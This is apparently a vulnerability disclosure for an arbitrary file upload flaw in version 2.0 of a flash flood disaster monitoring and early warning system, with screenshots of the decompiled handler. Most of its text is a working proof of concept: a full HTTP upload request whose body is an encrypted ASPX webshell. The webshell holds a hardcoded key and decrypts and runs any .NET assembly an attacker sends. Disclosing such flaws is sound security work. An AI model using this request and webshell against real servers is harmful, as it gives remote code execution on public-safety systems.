Flash flood Disaster monitoring and early warning system 2.0 service module has arbitrary file upload vulnerability

official website:http://www.cdwanjiang.com/

version:2.0

Vulnerability location:\Service\FileHandler.ashx

![WPS图片(1)](https://github.com/yueying638/cve/assets/139313752/e6ec69b8-8bb7-4e0e-9785-f4b41c86a8f9)

Tracking class:

\bin\MFCW.Web.dll

// MFCW.Web.Service.FileHandler

![WPS图片(2)](https://github.com/yueying638/cve/assets/139313752/aabe1aaa-f54e-4001-a1e1-57aba22c960d)
![WPS图片(3)](https://github.com/yueying638/cve/assets/139313752/2505e6fe-e6a0-470a-a5e7-feeb9598565b)
![WPS图片(4)](https://github.com/yueying638/cve/assets/139313752/864585e2-af65-4ac1-92f3-91a711cba771)
![WPS图片(5)](https://github.com/yueying638/cve/assets/139313752/b4843048-0e24-4195-8a0d-628a53160a0d)
![WPS图片(6)](https://github.com/yueying638/cve/assets/139313752/144c3e8d-d89b-421d-a3d7-05475acfc6a6)
![WPS图片(7)](https://github.com/yueying638/cve/assets/139313752/dea18149-6f47-4d48-9772-ee5f695a2711)
![WPS图片(8)](https://github.com/yueying638/cve/assets/139313752/729742a0-066b-4c0d-b0be-cba7a20a7c06)

Enter the SaveFile function when passing Action=Upload:
![WPS图片(9)](https://github.com/yueying638/cve/assets/139313752/a11a62db-d745-4fcb-b1b9-f6b80d265d88)
![WPS图片(10)](https://github.com/yueying638/cve/assets/139313752/dd1f6c41-8da9-4b5d-9adb-c6bbda790086)

Enter the WriteFile function:

Unfiltered file types are available to obtain webshell.
![WPS图片(11)](https://github.com/yueying638/cve/assets/139313752/607b52d7-aad1-451f-bb17-841c5cc2c735)

POC
```
POST /Service/FileHandler.ashx?Action=Upload&FileDirectory=E:/SCWJ/Official/Web/MFCW/Upload/&FileName=111.aspx&StartByte=0 HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 885

------WebKitFormBoundaryJa5U4zOAfmJDcYxj
Content-Disposition: form-data; name="userFile"; filename=""
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.IO"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {
            byte[] c = Convert.FromBase64String(line);
            Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>
------WebKitFormBoundaryJa5U4zOAfmJDcYxj--
```

An error is reported. But it was uploaded
![WPS图片(12)](https://github.com/yueying638/cve/assets/139313752/3e7f26bd-60ce-4b81-a52c-6d0036ac3933)
![WPS图片(13)](https://github.com/yueying638/cve/assets/139313752/e2c18565-25ab-49d4-bc3e-0cec15f2fb1d)

